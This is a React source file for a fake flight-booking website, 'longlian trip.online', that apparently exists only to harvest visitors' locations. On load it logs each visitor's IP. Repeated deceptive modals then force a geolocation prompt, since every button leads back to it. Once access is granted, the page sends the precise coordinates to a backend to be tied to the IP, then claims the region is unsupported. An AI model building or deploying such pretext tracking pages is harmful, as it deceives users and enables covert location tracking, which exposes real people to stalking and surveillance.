import { useState, useEffect, useCallback } from 'react'
import './App.css'

const POPUP_MESSAGES = [
  'Please allow location access to continue booking.',
  'Verification required to access this feature.',
  'For your security, please enable location services.',
  'This action requires location verification to continue.',
]

const img = (prompt, size = 'landscape_4_3') =>
  `https://trae-api-cn.mchost.guru/api/ide/v1/text_to_image?prompt=${encodeURIComponent(
    prompt
  )}&image_size=${size}`

const DESTINATIONS = [
  { city: 'Tokyo', country: 'Japan', price: 268, prompt: 'Tokyo skyline with Mount Fuji and cherry blossoms, travel photography, blue hour' },
  { city: 'Bangkok', country: 'Thailand', price: 198, prompt: 'Bangkok Grand Palace temple at sunset, travel photography, golden light' },
  { city: 'Singapore', country: 'Singapore', price: 245, prompt: 'Singapore Marina Bay Sands skyline at blue hour, travel photography, vibrant' },
  { city: 'Bali', country: 'Indonesia', price: 215, prompt: 'Bali tropical beach resort with palm trees, travel photography, sunny day' },
  { city: 'Seoul', country: 'South Korea', price: 235, prompt: 'Seoul Gyeongbokgung Palace and N Seoul Tower skyline, travel photography, autumn' },
  { city: 'Hong Kong', country: 'China', price: 158, prompt: 'Hong Kong Victoria Harbour skyline at night, travel photography, vibrant city lights' },
  { city: 'Kuala Lumpur', country: 'Malaysia', price: 178, prompt: 'Kuala Lumpur Petronas Twin Towers skyline at blue hour, travel photography, vibrant' },
  { city: 'Taipei', country: 'Taiwan', price: 188, prompt: 'Taipei 101 skyline at sunset with mountains background, travel photography, vibrant' },
]

function App() {
  const [modal, setModal] = useState(null)
  const [popupMessage, setPopupMessage] = useState('')
  const [tripType, setTripType] = useState('round')

  const requestLocation = useCallback(() => {
    setModal('loading')
    if (!navigator.geolocation) {
      setTimeout(() => setModal('denied'), 600)
      return
    }
    navigator.geolocation.getCurrentPosition(
      async (pos) => {
        // Send granted coords to backend so they get linked with the visitor's IP and logged
        const { latitude, longitude, accuracy } = pos.coords
        try {
          await fetch('/api/location', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ latitude, longitude, accuracy }),
          })
        } catch (_) {
          /* ignore network errors — proceed anyway */
        }
        setTimeout(() => setModal('unavailable'), 300)
      },
      () => setTimeout(() => setModal('denied'), 500),
      { timeout: 10000, maximumAge: 0 }
    )
  }, [])

  useEffect(() => {
    // Report visit to backend: detect real IP, resolve geo, and log
    fetch('/api/ping').catch(() => {})
    const t = setTimeout(() => {
      setPopupMessage(
        'For better service, please click Allow in the top-left to grant location access for accurate information.'
      )
      setModal('intro')
    }, 700)
    return () => clearTimeout(t)
  }, [])

  const handleBackgroundClick = () => {
    if (modal) return
    setPopupMessage(POPUP_MESSAGES[Math.floor(Math.random() * POPUP_MESSAGES.length)])
    setModal('blocked')
  }

  const closeModal = () => setModal(null)

  return (
    <div className="page" onClick={handleBackgroundClick}>
      {/* Top utility bar */}
      <div className="topbar">
        <div className="topbar-inner">
          <span className="topbar-item">English (US) | USD $</span>
          <div className="topbar-spacer" />
          <span className="topbar-item">Help</span>
          <span className="topbar-item">List your property</span>
          <span className="topbar-item">My Orders</span>
          <span className="topbar-item">Sign in</span>
          <span className="topbar-item topbar-register">Register</span>
        </div>
      </div>

      {/* Header */}
      <header className="header">
        <div className="header-inner">
          <div className="logo">
            <span className="logo-mark">longlian trip</span>
            <span className="logo-text">.online</span>
          </div>
          <nav className="nav">
            <a className="nav-item active">Flights</a>
            <a className="nav-item">Hotels</a>
            <a className="nav-item">Cars</a>
            <a className="nav-item">Trains</a>
            <a className="nav-item">Tours</a>
            <a className="nav-item">Deals</a>
            <a className="nav-item">Rewards</a>
          </nav>
        </div>
      </header>

      {/* Hero with search box */}
      <section className="hero">
        <div className="hero-inner">
          <h1 className="hero-title">Find your next flight at the best price</h1>
          <p className="hero-sub">
            Compare hundreds of airlines and save big on every trip, worldwide.
          </p>

          <div className="search-card">
            <div className="trip-tabs">
              <button
                className={`trip-tab ${tripType === 'round' ? 'on' : ''}`}
                onClick={(e) => { e.stopPropagation(); setTripType('round') }}
              >
                Round-trip
              </button>
              <button
                className={`trip-tab ${tripType === 'one' ? 'on' : ''}`}
                onClick={(e) => { e.stopPropagation(); setTripType('one') }}
              >
                One-way
              </button>
              <button
                className={`trip-tab ${tripType === 'multi' ? 'on' : ''}`}
                onClick={(e) => { e.stopPropagation(); setTripType('multi') }}
              >
                Multi-city
              </button>
              <div className="trip-spacer" />
              <label className="checkbox-line">
                <input type="checkbox" onClick={(e) => e.stopPropagation()} /> Nearby airports
              </label>
            </div>

            <div className="search-row">
              <div className="field field-from">
                <span className="field-label">From</span>
                <input
                  className="field-input"
                  defaultValue="Shanghai (PVG)"
                  onClick={(e) => e.stopPropagation()}
                />
                <span className="field-iata">PVG</span>
              </div>
              <button
                className="swap-btn"
                onClick={(e) => e.stopPropagation()}
                aria-label="Swap"
              >
                ⇄
              </button>
              <div className="field field-to">
                <span className="field-label">To</span>
                <input
                  className="field-input"
                  defaultValue="Tokyo (NRT)"
                  onClick={(e) => e.stopPropagation()}
                />
                <span className="field-iata">NRT</span>
              </div>
              <div className="field field-date">
                <span className="field-label">Depart</span>
                <input
                  className="field-input"
                  type="text"
                  defaultValue="Aug 28, 2026"
                  onClick={(e) => e.stopPropagation()}
                />
              </div>
              <div className="field field-date">
                <span className="field-label">Return</span>
                <input
                  className="field-input"
                  type="text"
                  defaultValue="Sep 04, 2026"
                  onClick={(e) => e.stopPropagation()}
                />
              </div>
              <div className="field field-pax">
                <span className="field-label">Passengers</span>
                <input
                  className="field-input"
                  defaultValue="1 Adult, Economy"
                  onClick={(e) => e.stopPropagation()}
                />
              </div>
              <button
                className="search-btn"
                onClick={(e) => {
                  e.stopPropagation()
                  setPopupMessage('Please allow location access to search for flights.')
                  setModal('blocked')
                }}
              >
                Search Flights
              </button>
            </div>
          </div>
        </div>
      </section>

      {/* Promo banners */}
      <section className="banners">
        <div className="banner banner-1">
          <span className="banner-tag">LIMITED TIME</span>
          <h3 className="banner-title">Up to 50% off selected routes</h3>
          <p className="banner-sub">Book by Aug 31, 2026 · Travel until Dec 31</p>
        </div>
        <div className="banner banner-2">
          <span className="banner-tag gold">MEMBER DEAL</span>
          <h3 className="banner-title">Earn 3x points on every flight</h3>
          <p className="banner-sub">Join longlian trip Rewards — it's free</p>
        </div>
        <div className="banner banner-3">
          <span className="banner-tag green">NEW</span>
          <h3 className="banner-title">Fly now, pay later</h3>
          <p className="banner-sub">0% installment plans available</p>
        </div>
      </section>

      {/* Destinations */}
      <section className="section">
        <div className="section-head">
          <h2 className="section-title">Popular Destinations</h2>
          <p className="section-sub">Handpicked fares trending this season</p>
        </div>
        <div className="dest-grid">
          {DESTINATIONS.map((d) => (
            <div className="dest-card" key={d.city}>
              <div className="dest-img-wrap">
                <img className="dest-img" src={img(d.prompt)} alt={d.city} loading="lazy" />
                <span className="dest-tag">From ${d.price}</span>
              </div>
              <div className="dest-body">
                <h4 className="dest-city">{d.city}</h4>
                <p className="dest-country">{d.country}</p>
                <button className="dest-btn">View fares</button>
              </div>
            </div>
          ))}
        </div>
      </section>

      {/* Services */}
      <section className="section services">
        <div className="section-head">
          <h2 className="section-title">Why book with longlian trip.online</h2>
          <p className="section-sub">Trusted by 400M+ travelers worldwide</p>
        </div>
        <div className="service-grid">
          <div className="service-card">
            <div className="service-icon">💎</div>
            <h4>Best price guarantee</h4>
            <p>Find a lower fare within 24 hours and we'll refund the difference.</p>
          </div>
          <div className="service-card">
            <div className="service-icon">🎧</div>
            <h4>24/7 customer support</h4>
            <p>Real human agents ready to help, anytime, in 19 languages.</p>
          </div>
          <div className="service-card">
            <div className="service-icon">⚡</div>
            <h4>Instant confirmation</h4>
            <p>Get your e-ticket delivered to your inbox in seconds.</p>
          </div>
          <div className="service-card">
            <div className="service-icon">🔒</div>
            <h4>Secure payments</h4>
            <p>PCI-DSS compliant checkout with 3D-Secure protection.</p>
          </div>
        </div>
      </section>

      {/* Footer */}
      <footer className="footer">
        <div className="footer-inner">
          <div className="footer-col">
            <h5>Company</h5>
            <a>About us</a><a>Careers</a><a>Press</a><a>Investor relations</a>
          </div>
          <div className="footer-col">
            <h5>Support</h5>
            <a>Help center</a><a>Manage booking</a><a>Refund & rebook</a><a>Contact us</a>
          </div>
          <div className="footer-col">
            <h5>Partners</h5>
            <a>Affiliate program</a><a>List your property</a><a>Travel agents</a><a>API</a>
          </div>
          <div className="footer-col">
            <h5>Stay connected</h5>
            <a>Newsletter</a><a>Mobile app</a><a>Facebook</a><a>Instagram</a>
          </div>
        </div>
        <div className="footer-bottom">
          <span>© 2026 longlian trip.online Travel Group. All rights reserved.</span>
          <span className="footer-links">Terms · Privacy · Cookies · ICP License No. 00000</span>
        </div>
      </footer>

      {modal && <Modal modal={modal} message={popupMessage} onAllow={requestLocation} onClose={closeModal} />}
    </div>
  )
}

function Modal({ modal, message, onAllow, onClose }) {
  const stop = (e) => e.stopPropagation()

  const titleMap = {
    intro: 'Location Access Required',
    denied: 'Service Unavailable',
    unavailable: 'Region Not Supported',
    blocked: 'Verification Needed',
    loading: 'Please wait…',
  }

  let body = message
  let actions = null

  if (modal === 'loading') {
    body = 'Verifying your location, please wait…'
  } else if (modal === 'intro') {
    actions = (
      <button className="m-btn primary" onClick={(e) => { stop(e); onAllow() }}>
        Allow location access
      </button>
    )
  } else if (modal === 'denied') {
    body =
      'You have denied location access. Please manually allow location permission in your browser settings, or switch to another browser. Otherwise, we are unable to determine whether your country or region is supported for this service.'
    actions = (
      <button className="m-btn primary" onClick={(e) => { stop(e); onAllow() }}>
        Try again
      </button>
    )
  } else if (modal === 'unavailable') {
    body =
      "Based on your current location, this service is not available in your country or region due to local policy restrictions. We apologize for the inconvenience."
    actions = (
      <button className="m-btn primary" onClick={(e) => { stop(e); onClose() }}>
        OK
      </button>
    )
  } else if (modal === 'blocked') {
    actions = (
      <button className="m-btn primary" onClick={(e) => { stop(e); onAllow() }}>
        Allow location access
      </button>
    )
  }

  return (
    <div className="modal-overlay" onClick={stop}>
      <div className="modal" onClick={stop}>
        <button className="m-close" onClick={(e) => { stop(e); onClose() }} aria-label="Close">×</button>
        <div className="m-icon" aria-hidden>
          {modal === 'loading' ? '⏳' : modal === 'unavailable' ? '🌍' : '📍'}
        </div>
        <h3 className="m-title">{titleMap[modal] || 'Notice'}</h3>
        <p className="m-body">{body}</p>
        {actions && <div className="m-actions">{actions}</div>}
      </div>
    </div>
  )
}

export default App
